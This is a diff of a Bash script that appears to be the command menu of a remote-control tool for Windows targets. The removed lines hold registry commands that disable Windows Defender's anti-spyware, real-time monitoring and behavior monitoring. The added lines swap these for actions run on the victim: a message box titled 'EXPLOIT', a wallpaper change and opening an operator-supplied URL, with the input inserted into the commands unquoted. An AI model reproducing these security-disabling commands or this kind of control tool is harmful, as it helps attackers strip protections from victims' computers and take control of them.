@@ -274,11 +274,11 @@ echo
 
 echo -e "${YELLOW}Shell Command List:${RESET}"
 echo
-echo -e "${YELLOW}1${RESET}. Disable ${PURPLE}Anti Spyware${RESET}   "
+echo -e "${YELLOW}1${RESET}. Send ${PURPLE}Message${RESET}   "
 echo
-echo -e "${YELLOW}2${RESET}. Disable ${PURPLE}Realtime Monitoring${RESET}  "
+echo -e "${YELLOW}2${RESET}. Change ${PURPLE}Desktop background${RESET}  "
 echo
-echo -e "${YELLOW}3${RESET}. Disable ${PURPLE}Behavior Monitoring${RESET} "
+echo -e "${YELLOW}3${RESET}. Open ${PURPLE}Web page${RESET} "
 echo
 echo -e "${YELLOW}4${RESET}. Show ${PURPLE}current directory${RESET} "
 echo
@@ -294,13 +294,31 @@ while true; do
 
   case $choice in
     1)
-      command='reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f'
+      echo
+  echo -e -n "${GREEN}Enter Message:${RESET} "
+  read -r message
+  echo
+
+  command="Add-Type -AssemblyName System.Windows.Forms
+          [System.Windows.Forms.MessageBox]::Show('$message', 'EXPLOIT', 'Ok', 'Information')"
       ;;
     2)
-      command='reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f'
+  echo
+  echo -e -n "${GREEN}Enter File name:${RESET} "
+  read -r file_names
+  echo
+  echo -e -n "${GREEN}Enter file directory: C:\ "${RESET}
+  read -r file_directorys
+  echo
+      command="reg add 'HKEY_CURRENT_USER\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d '$file_directorys\\$file_names' /f"
       ;;
     3)
-      command='reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f'
+      echo
+      echo -e -n "${GREEN}Enter URL:${RESET} "
+      read -r url
+      echo
+
+  command="cmd.exe /c start \"\" \"$url\""
       ;;
     4)
       command='pwd'
